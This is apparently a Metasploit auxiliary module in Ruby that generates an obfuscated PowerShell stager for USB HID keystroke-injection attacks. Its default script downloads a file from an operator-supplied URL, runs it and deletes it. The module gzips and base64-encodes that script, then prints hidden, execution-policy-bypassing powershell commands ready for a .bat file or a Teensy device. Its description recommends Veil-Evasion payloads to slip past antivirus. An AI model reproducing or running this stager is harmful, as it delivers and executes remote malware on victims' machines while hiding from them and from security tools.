require 'msf/core'
require 'rex'
require 'zlib'
require 'rex/text'

class MetasploitModule < Msf::Auxiliary

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Generate compressed and encoded PowerShell script.',
      'Description'   => %q{
        This module will provide a compressed and encoded PowerShell script
        from the input provided. 'default' action is to download the file,
        name it randomly, execute it, then delete it. You need to provide the full
        url to the file (example included). This is for use with an HID Attack Vector.
        Best option for file to be downloaded and ran is a Veil-Evasion powershell payload
        since it is text instead of a compiled executable.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Josh Hale "sn0wfa11"']
    ))

    register_options(
      [
        OptString.new('SCRIPT', [ false, "The script to be encoded.", nil]),
        OptString.new('URL', [ true, "Full URL path of the file to be downloaded", "http://ip-or-url:port/payload.bat"]),
	OptEnum.new('CMD', [true, 'Specify the module command', 'default', ['default','custom']])
      ], self.class)
    end

  def run
    case datastore['CMD'].to_s.downcase.to_sym
    when :default
      default_encode
    when :custom
      if datastore['SCRIPT']
        encode(datastore['SCRIPT'])
      else
        print_error("You must include a script for custom encoding")
        return
      end
    end
  end

  # This function will encode the default script using
  # the provided URL and filename
  # It will take use the file's extension and generate
  # a new random filename.
  #
  # @return [void] A useful return value is not expected here

  def default_encode
    script = "$c=new-object System.Net.WebClient; $u = '"
    script << datastore['URL']
    script << "'; $f = $Home + '\\"
    script << Rex::Text.rand_text_alpha(8)
    script << datastore['URL'].last(4)
    script << "'; $c.DownloadFile($u,$f); cmd.exe /c $f; remove-item $f;"

    encode(script)
  end

  # This function will encode the passed script using
  # PowerShell's compressor and encoder.
  #
  # @script [string class] script to be encoded and compressed
  #
  # @return [void] A useful return value is not expected here

  def encode(script)
    print_status("Attempting to encode the following powershell script:")
    print("\n#{script}\n\n")

    compressed_stream = Rex::Text.gzip(script)
    encoded_stream = Rex::Text.encode_base64(compressed_stream)

    # Build the powershell expression
    # Decode base64 encoded command and create a stream object
    psh_expression =  "$s=New-Object IO.MemoryStream(,"
    psh_expression << "[Convert]::FromBase64String('#{encoded_stream}'));"

    # Uncompress and invoke the expression (execute)
    psh_expression << 'IEX (New-Object IO.StreamReader('
    psh_expression << 'New-Object IO.Compression.GzipStream('
    psh_expression << '$s,'
    psh_expression << '[IO.Compression.CompressionMode]::Decompress)'
    psh_expression << ')).ReadToEnd();'

    print_good("Encoded:")
    print("\n#{psh_expression}\n\n")

    print_good("Windows .bat file ready:")
    bat_expression = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \""
    bat_expression << psh_expression
    bat_expression << "\""
    print("\n@echo off\n")
    print("#{bat_expression}\n\n")

    print_good("Teensy (Arduino) ready:")
    teensy_expression = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \\\""
    teensy_expression << psh_expression
    teensy_expression << "\\\""
    print("\n#{teensy_expression}\n\n")
  end
end
